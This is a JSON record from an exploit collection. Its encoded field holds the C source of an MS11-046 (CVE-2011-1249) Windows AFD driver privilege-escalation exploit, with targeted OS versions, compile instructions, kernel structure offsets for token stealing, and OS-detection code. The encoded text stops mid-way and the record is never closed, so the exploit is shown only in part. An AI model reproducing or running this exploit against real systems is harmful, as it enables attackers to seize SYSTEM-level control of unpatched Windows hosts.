{
    "source": "exploit-database", 
    "exploit": "LyoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgRXhwbG9pdCBUaXRsZTogV2luZG93cyB4ODYgKGFsbCB2ZXJzaW9ucykgQUZEIHByaXZpbGVnZSBlc2NhbGF0aW9uIChNUzExLTA0NikNCiMgRGF0ZTogMjAxNi0xMC0xNg0KIyBFeHBsb2l0IEF1dGhvcjogVG9taXNsYXYgUGFza2FsZXYNCiMgVnVsbmVyYWJsZSBTb2Z0d2FyZToNCiMgICBXaW5kb3dzIFhQIFNQMyB4ODYNCiMgICBXaW5kb3dzIFhQIFBybyBTUDIgeDY0DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDIgeDg2DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDIgeDY0DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDIgSXRhbml1bS1iYXNlZCBTeXN0ZW1zIA0KIyAgIFdpbmRvd3MgVmlzdGEgU1AxIHg4Ng0KIyAgIFdpbmRvd3MgVmlzdGEgU1AyIHg4Ng0KIyAgIFdpbmRvd3MgVmlzdGEgU1AxIHg2NA0KIyAgIFdpbmRvd3MgVmlzdGEgU1AyIHg2NA0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDggeDg2DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwOCBTUDIgeDg2DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwOCB4NjQNCiMgICBXaW5kb3dzIFNlcnZlciAyMDA4IFNQMiB4NjQNCiMgICBXaW5kb3dzIFNlcnZlciAyMDA4IEl0YW5pdW0tYmFzZWQgU3lzdGVtcw0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDggU1AyIEl0YW5pdW0tYmFzZWQgU3lzdGVtcw0KIyAgIFdpbmRvd3MgNyB4ODYNCiMgICBXaW5kb3dzIDcgU1AxIHg4Ng0KIyAgIFdpbmRvd3MgNyB4NjQNCiMgICBXaW5kb3dzIDcgU1AxIHg2NA0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDggUjIgeDY0DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwOCBSMiBTUDEgeDY0DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwOCBSMiBJdGFuaXVtLWJhc2VkIFN5c3RlbXMNCiMgICBXaW5kb3dzIFNlcnZlciAyMDA4IFIyIFNQMSBJdGFuaXVtLWJhc2VkIFN5c3RlbXMNCiMgU3VwcG9ydGVkIFZ1bG5lcmFibGUgU29mdHdhcmU6DQojICAgV2luZG93cyBYUCBTUDMgeDg2DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwMyBTUDIgeDg2DQojICAgV2luZG93cyBWaXN0YSBTUDEgeDg2DQojICAgV2luZG93cyBWaXN0YSBTUDIgeDg2DQojICAgV2luZG93cyBTZXJ2ZXIgMjAwOCB4ODYNCiMgICBXaW5kb3dzIFNlcnZlciAyMDA4IFNQMiB4ODYNCiMgICBXaW5kb3dzIDcgeDg2DQojICAgV2luZG93cyA3IFNQMSB4ODYNCiMgVGVzdGVkIFNvZnR3YXJlOg0KIyAgIFdpbmRvd3MgWFAgUHJvIFNQMyB4ODYgRU4gICAgICAgICAgWzUuMS4yNjAwXQ0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDMgRW50IFNQMiBFTiAgICAgWzUuMi4zNzkwXQ0KIyAgIFdpbmRvd3MgVmlzdGEgVWx0IFNQMSB4ODYgRU4gICAgICAgWzYuMC42MDAxXQ0KIyAgIFdpbmRvd3MgVmlzdGEgVWx0IFNQMiB4ODYgRU4gICAgICAgWzYuMC42MDAyXQ0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDggRGF0IFNQMSB4ODYgRU4gWzYuMC42MDAxXQ0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDggRW50IFNQMiB4ODYgRU4gWzYuMC42MDAyXQ0KIyAgIFdpbmRvd3MgNyBIQiB4ODYgRU4gICAgICAgICAgICAgICAgWzYuMS43NjAwXQ0KIyAgIFdpbmRvd3MgNyBFbnQgU1AxIHg4NiBFTiAgICAgICAgICAgWzYuMS43NjAxXQ0KIyBDVkUgSUQ6IDIwMTEtMTI0OQ0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBWdWxuZXJhYmlsaXR5IGRlc2NyaXB0aW9uOg0KIyAgIFRoZSBBbmNpbGxhcnkgRnVuY3Rpb24gRHJpdmVyIChBRkQpIHN1cHBvcnRzIFdpbmRvd3Mgc29ja2V0cyANCiMgICBhcHBsaWNhdGlvbnMgYW5kIGlzIGNvbnRhaW5lZCBpbiB0aGUgYWZkLnN5cyBmaWxlLiBUaGUgYWZkLnN5cw0KIyAgIGRyaXZlciBydW5zIGluIGtlcm5lbCBtb2RlIGFuZCBtYW5hZ2VzIHRoZSBXaW5zb2NrIFRDUC9JUA0KIyAgIGNvbW11bmljYXRpb25zIHByb3RvY29sLiANCiMgICBBbiBlbGV2YXRpb24gb2YgcHJpdmlsZWdlIHZ1bG5lcmFiaWxpdHkgZXhpc3RzIHdoZXJlIHRoZSBBRkQNCiMgICBpbXByb3Blcmx5IHZhbGlkYXRlcyBpbnB1dCBwYXNzZWQgZnJvbSB1c2VyIG1vZGUgdG8gdGhlIGtlcm5lbC4NCiMgICBBbiBhdHRhY2tlciBtdXN0IGhhdmUgdmFsaWQgbG9nb24gY3JlZGVudGlhbHMgYW5kIGJlIGFibGUgdG8NCiMgICBsb2cgb24gbG9jYWxseSB0byBleHBsb2l0IHRoZSB2dWxuZXJhYmlsaXR5Lg0KIyAgIEFuIGF0dGFja2VyIHdobyBzdWNjZXNzZnVsbHkgZXhwbG9pdGVkIHRoaXMgdnVsbmVyYWJpbGl0eSBjb3VsZA0KIyAgIHJ1biBhcmJpdHJhcnkgY29kZSBpbiBrZXJuZWwgbW9kZSAoaS5lLiB3aXRoIE5UIEFVVEhPUklUWVxTWVNURU0NCiMgICBwcml2aWxlZ2VzKS4NCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgRXhwbG9pdCBub3RlczoNCiMgICBQcml2aWxlZ2VkIHNoZWxsIGV4ZWN1dGlvbjoNCiMgICAgIC0gdGhlIFNZU1RFTSBzaGVsbCB3aWxsIHNwYXduIHdpdGhpbiB0aGUgaW52b2tpbmcgc2hlbGwvcHJvY2Vzcw0KIyAgIEV4cGxvaXQgY29tcGlsaW5nIChLYWxpIEdOVS9MaW51eCBSb2xsaW5nIDY0LWJpdCk6DQojICAgICAtICMgaTY4Ni13NjQtbWluZ3czMi1nY2MgTVMxMS0wNDYuYyAtbyBNUzExLTA0Ni5leGUgLWx3czJfMzINCiMgICBFeHBsb2l0IHByZXJlcXVpc2l0ZXM6DQojICAgICAtIGxvdyBwcml2aWxlZ2UgYWNjZXNzIHRvIHRoZSB0YXJnZXQgT1MNCiMgICAgIC0gdGFyZ2V0IE9TIG5vdCBwYXRjaGVkIChLQjI1MDM2NjUsIG9yIGFueSBvdGhlciByZWxhdGVkDQojICAgICAgIHBhdGNoLCBpZiBhcHBsaWNhYmxlLCBub3QgaW5zdGFsbGVkIC0gY2hlY2sgIlJlbGF0ZWQgc2VjdXJpdHkNCiMgICAgICAgdnVsbmVyYWJpbGl0aWVzL3BhdGNoZXMiKQ0KIyAgIEV4cGxvaXQgdGVzdCBub3RlczoNCiMgICAgIC0gbGV0IHRoZSB0YXJnZXQgT1MgYm9vdCBwcm9wZXJseSAoaWYgYXBwbGljYWJsZSkNCiMgICAgIC0gV2luZG93cyA3IChTUDAgYW5kIFNQMSkgd2lsbCBCU09EIG9uIHNodXRkb3duL3Jlc2V0DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIFBhdGNoZXM6DQojICAgV2luZG93cyBYUCBTUDMgeDg2DQojICAgICBXaW5kb3dzWFAtS0IyNTAzNjY1LXg4Ni1lbnUuZXhlDQojICAgICAgIChub3QgYXZhaWxhYmxlIC0gRW9MKQ0KIyAgIFdpbmRvd3MgU2VydmVyIDIwMDMgU1AyIHg4Ng0KIyAgICAgV2luZG93c1NlcnZlcjIwMDMtS0IyNTAzNjY1LXg4Ni1lbnUuZXhlDQojICAgICAgIGh0dHBzOi8vd3d3Lm1pY3Jvc29mdC5jb20vZW4tdXMvZG93bmxvYWQvZGV0YWlscy5hc3B4P2lkPTI2NDgzDQojICAgV2luZG93cyBWaXN0YSBTUDEsIFNQMiB4ODY7IFdpbmRvd3MgU2VydmVyIDIwMDggKFNQMSksIFNQMiB4ODYNCiMgICAgIFdpbmRvd3M2LjAtS0IyNTAzNjY1LXg4Ni5tc3UNCiMgICAgICAgaHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9kb3dubG9hZC9kZXRhaWxzLmFzcHg/aWQ9MjYyNzUNCiMgICBXaW5kb3dzIDcgKFNQMCksIFNQMSB4ODYNCiMgICAgIFdpbmRvd3M2LjEtS0IyNTAzNjY1LXg4Ni5tc3UNCiMgICAgICAgaHR0cHM6Ly93d3cubWljcm9zb2Z0LmNvbS9lbi11cy9kb3dubG9hZC9kZXRhaWxzLmFzcHg/aWQ9MjYzMTENCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgUmVsYXRlZCBzZWN1cml0eSB2dWxuZXJhYmlsaXRpZXMvcGF0Y2hlczoNCiMgICBNUzExLTA0NiAgS0IyNTAzNjY1ICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTEtMDQ2LmFzcHgNCiMgICBNUzExLTA4MCAgS0IyNTkyNzk5ICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTEtMDgwLmFzcHgNCiMgICBNUzEyLTAwOSAgS0IyNjQ1NjQwICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTItMDA5LmFzcHgNCiMgICBNUzEzLTA5MyAgS0IyODc1NzgzICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTMtMDkzLmFzcHgNCiMgICBNUzE0LTA0MCAgS0IyOTc1Njg0ICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTQtMDQwLmFzcHgNCiMNCiMgICBUYWJsZSBvZiBwYXRjaCByZXBsYWNlbWVudHM6DQojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgTVMxMS0wNDYgIHwgTVMxMS0wODAgIHwgTVMxMi0wMDkgIHwgTVMxMy0wOTMgIHwgTVMxNC0wNDAgIHwNCiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IEtCMjUwMzY2NSB8IEtCMjU5Mjc5OSB8IEtCMjY0NTY0MCB8IEtCMjg3NTc4MyB8IEtCMjk3NTY4NCB8DQojICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgICBXaW5kb3dzIHg4NiBYUCBTUDMgICAgICAgICAgfCBJbnN0YWxsZWQgfCA8LVJlcGxhY2VzfCAgICAgLSAgICAgfCAgICAgLSAgICAgfCAgICAgLSAgICAgfA0KIyAgIFdpbmRvd3MgeDg2IFNlcnZlciAyMDAzIFNQMiB8IEluc3RhbGxlZCB8IDwtUmVwbGFjZXN8IDwtUmVwbGFjZXN8ICAgICAtICAgICB8IDwtUmVwbGFjZXN8DQojICAgV2luZG93cyB4ODYgVmlzdGEgU1AxICAgICAgIHwgSW5zdGFsbGVkIHwgICAgIC0gICAgIHwgICAgIC0gICAgIHwgICAgIC0gICAgIHwgICAgIC0gICAgIHwNCiMgICBXaW5kb3dzIHg4NiBWaXN0YSBTUDIgICAgICAgfCBJbnN0YWxsZWQgfCAgICAgLSAgICAgfCAgICAgLSAgICAgfCAgICAgLSAgICAgfCA8LVJlcGxhY2VzfA0KIyAgIFdpbmRvd3MgeDg2IFNlcnZlciAyMDA4ICAgICB8IEluc3RhbGxlZCB8ICAgICAtICAgICB8ICAgICAtICAgICB8ICAgICAtICAgICB8ICAgICAtICAgICB8DQojICAgV2luZG93cyB4ODYgU2VydmVyIDIwMDggU1AyIHwgSW5zdGFsbGVkIHwgICAgIC0gICAgIHwgICAgIC0gICAgIHwgICAgIC0gICAgIHwgPC1SZXBsYWNlc3wNCiMgICBXaW5kb3dzIHg4NiA3ICAgICAgICAgICAgICAgfCBJbnN0YWxsZWQgfCAgICAgLSAgICAgfCAgICAgLSAgICAgfCAgICAgLSAgICAgfCAgICAgLSAgICAgfA0KIyAgIFdpbmRvd3MgeDg2IDcgU1AxICAgICAgICAgICB8IEluc3RhbGxlZCB8ICAgICAtICAgICB8ICAgICAtICAgICB8ICAgICAtICAgICB8IDwtUmVwbGFjZXN8DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIFRoYW5rcyB0bzoNCiMgICBhenkgKFhQLCAyazMgZXhwbG9pdCkNCiMgICBSYWh1bCBTYXNpIChQb0MpDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIFJlZmVyZW5jZXM6DQojICAgaHR0cHM6Ly93ZWIubnZkLm5pc3QuZ292L3ZpZXcvdnVsbi9kZXRhaWw/dnVsbklkPUNWRS0yMDExLTEyNDkNCiMgICBodHRwczovL3RlY2huZXQubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3NlY3VyaXR5L21zMTEtMDQ2LmFzcHgNCiMgICBodHRwOi8vd2ViLnFod2lucy5jb20vU2VjdXJpdHkvMjAxMjAyMTcxMjAyMzY0MTg3NDEyNi5odG1sDQojICAgaHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvMTg3NTUvDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQoqLw0KDQoNCiNpbmNsdWRlIDx3aW5zb2NrMi5oPg0KI2luY2x1ZGUgPHdpbmRvd3MuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHdzMnRjcGlwLmg+DQoNCiNwcmFnbWEgY29tbWVudCAobGliLCAid3MyXzMyLmxpYiIpDQoNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8gREVGSU5FIERBVEEgVFlQRVMNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KdHlwZWRlZiBlbnVtIF9LUFJPRklMRV9TT1VSQ0Ugew0KICAgIFByb2ZpbGVUaW1lLA0KICAgIFByb2ZpbGVBbGlnbm1lbnRGaXh1cCwNCiAgICBQcm9maWxlVG90YWxJc3N1ZXMsDQogICAgUHJvZmlsZVBpcGVsaW5lRHJ5LA0KICAgIFByb2ZpbGVMb2FkSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVQaXBlbGluZUZyb3plbiwNCiAgICBQcm9maWxlQnJhbmNoSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVUb3RhbE5vbmlzc3VlcywNCiAgICBQcm9maWxlRGNhY2hlTWlzc2VzLA0KICAgIFByb2ZpbGVJY2FjaGVNaXNzZXMsDQogICAgUHJvZmlsZUNhY2hlTWlzc2VzLA0KICAgIFByb2ZpbGVCcmFuY2hNaXNwcmVkaWN0aW9ucywNCiAgICBQcm9maWxlU3RvcmVJbnN0cnVjdGlvbnMsDQogICAgUHJvZmlsZUZwSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVJbnRlZ2VySW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGUySXNzdWUsDQogICAgUHJvZmlsZTNJc3N1ZSwNCiAgICBQcm9maWxlNElzc3VlLA0KICAgIFByb2ZpbGVTcGVjaWFsSW5zdHJ1Y3Rpb25zLA0KICAgIFByb2ZpbGVUb3RhbEN5Y2xlcywNCiAgICBQcm9maWxlSWNhY2hlSXNzdWVzLA0KICAgIFByb2ZpbGVEY2FjaGVBY2Nlc3NlcywNCiAgICBQcm9maWxlTWVtb3J5QmFycmllckN5Y2xlcywNCiAgICBQcm9maWxlTG9hZExpbmtlZElzc3VlcywNCiAgICBQcm9maWxlTWF4aW11bQ0KfSBLUFJPRklMRV9TT1VSQ0UsICpQS1BST0ZJTEVfU09VUkNFOw0KDQoNCnR5cGVkZWYgRFdPUkQgKFdJTkFQSSAqUE5UUVVFUllJTlRFUlZBTCkgKA0KICAgIEtQUk9GSUxFX1NPVVJDRSAgIFByb2ZpbGVTb3VyY2UsDQogICAgUFVMT05HICAgICAgICAgICAgSW50ZXJ2YWwNCik7DQoNCg0KdHlwZWRlZiBMT05HIE5UU1RBVFVTOw0KDQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqUE5UQUxMT0NBVEUpICgNCiAgICBIQU5ETEUgICAgICAgICAgICBQcm9jZXNzSGFuZGxlLA0KICAgIFBWT0lEICAgICAgICAgICAgICpCYXNlQWRkcmVzcywNCiAgICBVTE9ORyAgICAgICAgICAgICBaZXJvQml0cywNCiAgICBQVUxPTkcgICAgICAgICAgICBSZWdpb25TaXplLA0KICAgIFVMT05HICAgICAgICAgICAgIEFsbG9jYXRpb25UeXBlLA0KICAgIFVMT05HICAgICAgICAgICAgIFByb3RlY3QNCik7DQoNCg0KdHlwZWRlZiBzdHJ1Y3QgX0lPX1NUQVRVU19CTE9DSyB7DQogICAgdW5pb24gew0KICAgICAgICBOVFNUQVRVUyAgICAgIFN0YXR1czsNCiAgICAgICAgUFZPSUQgICAgICAgICBQb2ludGVyOw0KICAgIH07DQogICAgVUxPTkdfUFRSICAgICAgICAgSW5mb3JtYXRpb247DQp9IElPX1NUQVRVU19CTE9DSywgKlBJT19TVEFUVVNfQkxPQ0s7DQoNCg0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gew0KICAgIFVMT05HICAgICAgICAgICAgIFJlc2VydmVkWzJdOw0KICAgIFBWT0lEICAgICAgICAgICAgIEJhc2U7DQogICAgVUxPTkcgICAgICAgICAgICAgU2l6ZTsNCiAgICBVTE9ORyAgICAgICAgICAgICBGbGFnczsNCiAgICBVU0hPUlQgICAgICAgICAgICBJbmRleDsNCiAgICBVU0hPUlQgICAgICAgICAgICBVbmtub3duOw0KICAgIFVTSE9SVCAgICAgICAgICAgIExvYWRDb3VudDsNCiAgICBVU0hPUlQgICAgICAgICAgICBNb2R1bGVOYW1lT2Zmc2V0Ow0KICAgIENIQVIgICAgICAgICAgICAgIEltYWdlTmFtZVsyNTZdOw0KfSBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OLCAqUFNZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT047DQoNCg0KdHlwZWRlZiBCT09MIChXSU5BUEkgKkxQRk5fSVNXT1c2NFBST0NFU1MpIChIQU5ETEUsIFBCT09MKTsNCg0KDQovLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQovLyBGVU5DVElPTlMNCi8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KQk9PTCBJc1dvdzY0KCkNCnsNCiAgICBCT09MIGJJc1dvdzY0ID0gRkFMU0U7DQogICAgTFBGTl9JU1dPVzY0UFJPQ0VTUyBmbklzV293NjRQcm9jZXNzOw0KDQogICAgZm5Jc1dvdzY0UHJvY2VzcyA9IChMUEZOX0lTV09XNjRQUk9DRVNTKSBHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoVEVYVCgia2VybmVsMzIiKSksICJJc1dvdzY0UHJvY2VzcyIpOw0KDQogICAgaWYoTlVMTCAhPSBmbklzV293NjRQcm9jZXNzKQ0KICAgIHsNCiAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODQxMzkodj12cy44NSkuYXNweA0KICAgICAgICBpZiAoIWZuSXNXb3c2NFByb2Nlc3MoR2V0Q3VycmVudFByb2Nlc3MoKSwgJmJJc1dvdzY0KSkNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODEzODEodj12cy44NSkuYXNweA0KICAgICAgICAgICAgcHJpbnRmKCIgICBbLV0gRmFpbGVkIChlcnJvciBjb2RlOiAlZClcbiIsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gYklzV293NjQ7DQp9DQoNCg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KLy8gTUFJTiBGVU5DVElPTg0KLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQppbnQgbWFpbih2b2lkKQ0Kew0KICAgIHByaW50ZigiWypdIE1TMTEtMDQ2IChDVkUtMjAxMS0xMjQ5KSB4ODYgZXhwbG9pdFxuIik7DQogICAgcHJpbnRmKCIgICBbKl0gYnkgVG9taXNsYXYgUGFza2FsZXZcbiIpOw0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gSURFTlRJRlkgVEFSR0VUIE9TIEFSQ0hJVEVDVFVSRSBBTkQgVkVSU0lPTg0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgIHByaW50ZigiWypdIElkZW50aWZ5aW5nIE9TXG4iKTsNCg0KDQogICAgLy8gaWRlbnRpZnkgdGFyZ2V0IG1hY2hpbmUncyBPUyBhcmNoaXRlY3R1cmUNCiAgICAvLyBpbiBjYXNlIHRoZSB0YXJnZXQgbWFjaGluZSBpcyBydW5uaW5nIGEgNjQtYml0IE9TDQogICAgaWYoSXNXb3c2NCgpKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCIgICBbLV0gNjQtYml0XG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIHByaW50ZigiICAgWytdIDMyLWJpdFxuIik7DQoNCg0KICAgIC8vIGlkZW50aWZ5IHRhcmdldCBtYWNoaW5lJ3MgT1MgdmVyc2lvbg0KICAgIC8vIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvd2luZG93cy9kZXNrdG9wL21zNzI0NDUxKHY9dnMuODUpLmFzcHgNCiAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczcyNDgzMih2PXZzLjg1KS5hc3B4DQogICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM3MjQ4MzModj12cy44NSkuYXNweA0KICAgIE9TVkVSU0lPTklORk9FWCBvc3ZpOw0KICAgIFplcm9NZW1vcnkoJm9zdmksIHNpemVvZihPU1ZFUlNJT05JTkZPRVgpKTsNCiAgICBvc3ZpLmR3T1NWZXJzaW9uSW5mb1NpemUgPSBzaXplb2YoT1NWRVJTSU9OSU5GT0VYKTsNCiAgICBHZXRWZXJzaW9uRXgoKExQT1NWRVJTSU9OSU5GTykgJm9zdmkpOw0KDQogICAgLy8gZGVmaW5lIG9wZXJhdGluZyBzeXN0ZW0gdmVyc2lvbiBzcGVjaWZpYyB2YXJpYWJsZXMNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZV9LUFJPQ0VTUzsNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZV9UT0tFTjsNCiAgICB1bnNpZ25lZCBjaGFyIHNoZWxsY29kZV9VUElEOw0KICAgIHVuc2lnbmVkIGNoYXIgc2hlbGxjb2RlX0FQTElOS1M7DQogICAgY29uc3QgY2hhciAqKnNlY3VyaXR5UGF0Y2hlc1B0cjsNCiAgICBpbnQgc2VjdXJpdHlQYXRjaGVzQ291bnQ7DQogICAgaW50IGxwSW5CdWZmZXJTaXplOw0KDQogICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KICAgIC8qDQogICAgT1MgVkVSU0lPTiBTUEVDSUZJQyBPRkZTRVRTDQoNCiAgICByZWZlcmVuY2VzOg0KICAgICAgaHR0cDovL3d3dy5nZW9mZmNoYXBwZWxsLmNvbS9zdHVkaWVzL3dpbmRvd3Mva20vbnRvc2tybmwvc3RydWN0cy9rdGhyZWFkL29yaWdpbmFsLmh0bQ0KICAgICAgaHR0cDovL3d3dy5nZW9mZmNoYXBwZWxsLmNvbS9zdHVkaWVzL3dpbmRvd3Mva20vbnRvc2tybmwvc3RydWN0cy9rdGhyZWFkL2xhdGU1Mi5odG0NCiAgICAgIGh0dHA6Ly93d3cuZ2VvZmZjaGFwcGVsbC5jb20vc3R1ZGllcy93aW5kb3dzL2ttL250b3Nrcm5sL3N0cnVjdHMva3RocmVhZC9jdXJyZW50Lmh0bQ0KICAgICAgaHR0cDovL3d3dy5nZW9mZmNoYXBwZWxsLmNvbS9zdHVkaWVzL3dpbmRvd3Mva20vbnRvc2tybmwvc3RydWN0cy9lcHJvY2Vzcy8NCg0KDQogICAgLSBudCFfS1RIUkVBRC5BcGNTdGF0ZS5Qcm9jZXNzICgrMHgxMCkNCiAgICAweDMwICgzLjUxKTsNCiAgICAweDM0ICg+My41MSB0byA1LjEpOw0KICAgIDB4MjggKGxhdGUgNS4yKTsNCiAgICAweDM4ICg2LjApOw0KICAgIDB4NDAgKDYuMSk7DQogICAgMHg3MCAoNi4yIGFuZCBoaWdoZXIpDQoNCiAgICAtIG50IV9FUFJPQ0VTUy5Ub2tlbg0KICAgIDB4MDEwOCAoMy41MSB0byA0LjApOw0KICAgIDB4MDEyQyAoNS4wKTsNCiAgICAweEM4ICg1LjEgdG8gZWFybHkgNS4yKTsNCiAgICAweEQ4IChsYXRlIDUuMik7DQogICAgMHhFMCAoNi4wKTsNCiAgICAweEY4ICg2LjEpOw0KICAgIDB4RUMgKDYuMiB0byA2LjMpOw0KICAgIDB4RjQNCg0KICAgIC0gbnQhX0VQUk9DRVNTLlVuaXF1ZVByb2Nlc3NJZA0KICAgIDB4OTQgKDMuNTEgdG8gNC4wKTsNCiAgICAweDlDICg1LjApOw0KICAgIDB4ODQgKDUuMSB0byBlYXJseSA1LjIpOw0KICAgIDB4OTQgKGxhdGUgNS4yKTsNCiAgICAweDlDICg2LjApOw0KICAgIDB4QjQNCg0KICAgIC0gbnQhX0VQUk9DRVNTLkFjdGl2ZVByb2Nlc3NMaW5rcy5GbGluaw0KICAgIDB4OTggKDMuNTEgdG8gNC4wKTsNCiAgICAweEEwICg1LjApOw0KICAgIDB4ODggKDUuMSB0byBlYXJseSA1LjIpOw0KICAgIDB4OTggKGxhdGUgNS4yKTsNCiAgICAweEEwICg2LjApOw0KICAgIDB4QjgNCg0KICAgICovDQogICAgLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQogICAgLy8gaW4gY2FzZSB0aGUgT1MgdmVyc2lvbiBpcyA1LjEsIHNlcnZpY2UgcGFjayAzDQogICAgaWYoKG9zdmkuZHdNYWpvclZlcnNpb24gPT0gNSkgJiY